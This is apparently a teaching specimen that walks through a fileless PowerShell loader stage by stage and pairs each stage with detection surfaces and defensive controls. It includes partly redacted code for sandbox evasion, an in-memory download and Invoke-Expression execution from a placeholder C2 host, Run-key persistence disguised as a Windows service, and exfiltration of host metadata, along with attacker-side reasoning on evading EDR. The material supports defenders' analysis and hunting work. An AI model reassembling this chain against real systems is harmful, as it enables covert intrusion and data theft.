# FILELESS MALWARE DEMO | SAFE ANALYSIS SPECIMEN
# Static review only. Non-executable. Behavior models are redacted.
# MITRE ATT&CK: T1059.001, T1027, T1055, T1547.001, T1082, T1497, T1041

================================================================================

[BOOTSTRAP]

    $ErrorActionPreference = <silenced>
    $ProgressPreference    = <silenced>

OBJECTIVE: Silence PowerShell's built-in error reporting & progress output
           before the loader begins any meaningful host interaction.

RATIONALE:
- EDR (Endpoint Detection & Response) agents & security monitoring tools often
  treat stderr output & progress stream activity as behavioral signals.
- Silencing both removes a passive detection layer before the loader performs
  any meaningful action, so the process tree appears idle rather than active.

DETECTION SURFACE:
- Interpreter launched with output suppression flags
- No stderr/stdout visible in the data collected by monitoring tools
  (telemetry: process output, file writes, network calls, registry changes)
- Anomalous silence in child PowerShell process chain
  (most legit sessions produce visible activity)

ATT&CK: [ T1059.001 ] Command & Scripting Interpreter: PowerShell

[ENV_AWARENESS]

    $hostName = [Environment]::GetEnvironmentVariable(<COMPUTERNAME>)
    $userName = [Environment]::GetEnvironmentVariable(<USERNAME>)

    $suspiciousHostTokens = @( <SANDBOX>, <MALWARE>, <VIRUS>, <VBOX>, <VMWARE> )
    $suspiciousUserTokens = @( <Analyst>, <Admin>, <Researcher>, <Sandbox> )

    if ($hostName -match $suspiciousHostTokens) { exit }
    if ($userName -match $suspiciousUserTokens) { exit }

OBJECTIVE: Fingerprint (collect identifying info about) the host machine
           & abort execution if analysis infrastructure is detected.

RATIONALE:
- If the loader runs inside a sandbox/analyst VM (analysis infrastructure):
  1. payload gets captured
  2. C2 endpoint gets blocklisted
  3. whole campaign is compromised
  4. attacker is forced to rebuild infrastructure from scratch
- Aborting early on suspicious hosts is cheaper than losing the entire
  operation to a single analysis run.
- More advanced, real-world samples go further: enumerating VM artifacts
  (e.g., VMware Tools), detecting analyst tools (e.g., Wireshark, Ghidra),
  profiling hardware (e.g., low core count, low RAM), or timing checks
  (call Sleep() for a known duration, then measure how much time actually
   passed; sandboxes often fast-forward sleep calls).

DETECTION SURFACE:
- Environment variable enumeration at process start
- String comparisons against known sandbox indicators
- Rapid process exit with no output (abort branch triggered)
- WMI queries for hardware profile data

ATT&CK: [ T1082 ] System Information Discovery
        [ T1497 ] Virtualization/Sandbox Evasion

[C2_PROFILE]

    $c2Endpoint    = <https://[redacted].example.com/payload>
    $exfilEndpoint = <https://[redacted].example.com/exfil>
    $userAgent     = <Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...>

OBJECTIVE: Define the C2 (Command & Control) server endpoints & disguise
           settings used to retrieve the payload & send stolen data back.

RATIONALE:
- HTTPS traffic to external hosts is common enough that it rarely triggers
  alerts on its own (it looks like normal web browsing to most tools).
- A spoofed User-Agent string makes requests appear to come from a browser,
  helping them pass through corporate proxy & firewall inspection unnoticed.
- Delivering the payload as encoded text rather than a raw binary prevents
  security tools from flagging an unexpected file download over what looks
  like a normal HTTPS request.

DETECTION SURFACE:
- HTTPS connections from interpreter processes to non-CDN destinations
- Spoofed/mismatched User-Agent strings in proxy logs
- Hardcoded URLs recoverable via string extraction/memory forensics
- DNS queries to recently registered/low-reputation domains

ATT&CK: [ T1071.001 ] Application Layer Protocol: Web Protocols

[MEMORY_RETRIEVAL]

    $client = New-Object <Net.WebClient>
    $client.Headers.Add(<User-Agent>, $userAgent)

    try {
        $encodedPayload = $client.<DownloadString>($c2Endpoint)
    }
    catch {
        exit   # SILENT FAILURE (NO OUTPUT/CRASH/ALERT)
    }

OBJECTIVE: Download the payload from C2 directly into memory without
           writing anything to disk.

RATIONALE:
- Antivirus engines maintain hash databases of known malicious files &
  scan anything written to disk at write time.
- A payload that never touches the file system never gets hashed, never
  gets matched against a signature database, & leaves no artifact for
  post-incident forensic review.
- Storing the payload as a variable in memory bypasses this detection
  layer entirely.

DETECTION SURFACE:
- WebClient/WebRequest instantiation from interpreter process
- Outbound HTTPS from powershell.exe/wscript.exe/mshta.exe
- Sysmon Event ID 3: network connection with no corresponding file write
- Proxy logs: content-type mismatch (text/plain delivering encoded blob)

HUNTING NOTE (CORRELATION): Interpreter launch → outbound HTTPS → no file
                            write → Base64 decode activity
                            (this chain = high-fidelity behavioral signal).

ATT&CK: [ T1059.001 ] Command & Scripting Interpreter: PowerShell
        [ T1027 ] Obfuscated Files or Information

================================================================================

[DECODE_STAGE]

    $decodedBytes   = [Convert]::<FromBase64String>($encodedPayload)
    $decodedPayload = [Text.Encoding]::Unicode.<GetString>($decodedBytes)

OBJECTIVE: Decode the Base64-encoded payload retrieved from C2 into executable
           logic, entirely within memory.
RATIONALE:
- Base64 requires no third-party libraries, no suspicious API imports, &
  no custom decryption logic (the decode function is built directly into .NET,
  so it blends in with normal runtime behavior).
- This keeps the behavioral footprint small compared to encryption-based
  obfuscation schemes (which introduce additional imports that analysts &
  automated tools actively look for).
- No disk write occurs at any point in this stage; the decoded payload exists
  only as a variable in memory.

DETECTION SURFACE:
- FromBase64String calls on large input buffers
- Memory regions marked executable shortly after decode
- AMSI (Anti Malware Scan Interface) scans content before execution
  (decoded payload may get flagged here even without a file on disk)
- Decoded payload recoverable from heap via memory forensics before
  garbage collection (GC) clears it

ATT&CK: [ T1027 ] Obfuscated Files or Information

[RUNTIME_EXECUTION]

    <Invoke-Expression> $decodedPayload     # MOST COMMON

    OR (EQUIVALENTLY)

    [ScriptBlock]::Create($decodedPayload).Invoke()     # LESS SIGNATURED

OBJECTIVE: Execute the decoded payload directly from memory without any file
           system interaction.

RATIONALE:
- Evaluating a string as code is the defining primitive of fileless execution
  (payload never exists as a file, only as a transient string object in memory).
- This evades any detection that relies on scanning files at rest
  (since there is no file to scan).
- On a default Windows install, neither Invoke-Expression nor
  ScriptBlock::Create are logged, making this stage invisible without
  additional security tooling in place.

DETECTION SURFACE:
- Invoke-Expression/IEX called on non-trivial string content
- ScriptBlock logging Event ID 4104: full payload captured in plaintext
- AMSI hook: payload submitted for inspection at decode→execute boundary
- Parent/child anomaly: unexpected child processes spawned by powershell.exe
- Constrained Language Mode (CLM) violation if policy is enforced

HUNTING NOTE (HIGHEST VALUE): ScriptBlock logging (Event ID 4104) captures
                              the decoded payload in plaintext regardless of
                              how it was obfuscated upstream (works even if
                              Base64/other encoding was used to hide it).

ATT&CK: [ T1059.001 ] Command & Scripting Interpreter: PowerShell
        [ T1055 ] Process Injection / In-Memory Execution

[PERSISTENCE]

    $regPath   = <HKCU:\Software\Microsoft\Windows\CurrentVersion\Run>
    $entryName = <WindowsUpdateService>
    $loaderCmd = "powershell.exe <-WindowStyle Hidden> <-ExecutionPolicy Bypass>
                  <-File> <$loaderPath>"

    # BEHAVIOR DESCRIBED ONLY, WRITE OPERATION NOT PRESENT:
    New-ItemProperty -Path $regPath -Name $entryName -Value $loaderCmd

OBJECTIVE: Establish a logon-triggered autostart entry so the loader
           survives reboots without needing to be re-delivered.

RATIONALE:
- Registry Run keys under HKCU (current user section) require no admin
  privileges to write (standard user access is sufficient).
- This matters for phishing-delivered loaders, which typically run in
  the context of a normal user account with no elevated permissions.
- The entry name is chosen to resemble a legitimate Windows background
  service, reducing the chance a user or analyst notices it during a
  manual review.

DETECTION SURFACE:
- Registry write to CurrentVersion\Run (Sysmon Event ID 13)
- powershell.exe with -WindowStyle Hidden in autostart value
- Autoruns/persistence hunting tooling flags new Run entries
- Entry name mimicking legitimate services (typosquatting pattern)

ATT&CK: [ T1547.001 ] Boot or Logon Autostart Execution: Registry Run Keys

[COLLECTION_EXFIL]

    $sysInfo = @{
        Hostname     = [Environment]::GetEnvironmentVariable(<COMPUTERNAME>)
        Username     = [Environment]::GetEnvironmentVariable(<USERNAME>)
        Domain       = [Environment]::GetEnvironmentVariable(<USERDOMAIN>)
        OS           = <(Get-WmiObject Win32_OperatingSystem).Caption>
        Architecture = [Environment]::GetEnvironmentVariable(<PROCESSOR_ARCHITECTURE>)
    }

    $jsonBlob    = <ConvertTo-Json> $sysInfo
    $encodedBlob = [Convert]::<ToBase64String>([Text.Encoding]::UTF8.<GetBytes>($jsonBlob))

    $client = New-Object <Net.WebClient>
    $client.<UploadString>($exfilEndpoint, $encodedBlob)

OBJECTIVE: Collect basic system metadata & transmit it back to the
           attacker over the established C2 channel.

RATIONALE:
- The first exfil pass is intentionally lightweight; the attacker uses
  this metadata to decide whether the machine is worth deploying
  additional tooling against (ransomware, lateral movement frameworks,
  keyloggers, credential harvesters, etc.).
- Domain membership, hostname, & OS edition together reveal target value:
  - a domain-joined machine hostname (e.g., DC01, EXEC, SQL) gets escalated;
  - a standalone Windows Home PC with an auto-generated hostname gets abandoned.
- The data is serialized to JSON & Base64-encoded so it can be transmitted
  safely as plaintext in an HTTP POST body
  (no binary transfer, no suspicious content-type).

DETECTION SURFACE:
- WMI query for Win32_OperatingSystem (Sysmon Event ID 20)
- Outbound HTTP POST from interpreter process
- POST body containing Base64-encoded JSON to external destination
- Payload volume (~200 bytes) inconsistent with legitimate web traffic

ATT&CK: [ T1082 ] System Information Discovery
        [ T1041 ] Exfiltration Over C2 Channel
        [ T1027 ] Obfuscated Files or Information

[ANALYST_NOTES]

REVERSE ENGINEERING INDICATORS:
- IMPORTS TO FLAG:
  - Net.WebClient / System.Net.HttpClient   → network communication
  - Convert::FromBase64String               → payload decoding
  - Text.Encoding::Unicode / UTF8           → string reconstruction
  - Microsoft.Win32.Registry                → persistence writes
  - Get-WmiObject / WMI                     → host reconnaissance
- STRING ARTIFACTS:
  - encoded C2 URLs (Base64 or XOR'd)
  - spoofed User-Agent substrings
  - registry key paths under CurrentVersion\Run
  - WMI class names: Win32_OperatingSystem, Win32_ComputerSystem
- BEHAVIORAL CHAIN:
  - interpreter → outbound HTTPS → no file write → Base64 decode → IEX
  - short-lived process, no output           → sandbox abort branch
  - registry write at session end            → persistence installed
- MEMORY FORENSICS:
  - decoded payload recoverable from heap before garbage collection (GC)
  - HTTP response buffer may persist in memory after download
  - Volatility: cmdline, malfind, netscan for corroboration

DEFENSIVE CONTROLS (PRIORITY ORDER):
1. ScriptBlock Logging (Event ID 4104)
   - Captures decoded payload in plaintext regardless of upstream obfuscation.
   - Highest-value single control against this class.
2. AMSI Integration
   - Intercepts content at the decode→execute boundary.
   - Effective against known payload signatures.
3. Constrained Language Mode / WDAC / AppLocker
   - Eliminates IEX & ScriptBlock::Create as execution primitives.
   - Blocks this technique class entirely if enforced.
4. Egress Filtering + TLS Inspection
   - Breaks memory retrieval if C2 is unreachable.
   - TLS inspection required to inspect HTTPS payload content.
5. Registry Persistence Monitoring (Sysmon Event ID 13)
   - Detects autostart writes at install time.
   - Autoruns baseline comparison effective for hunting.
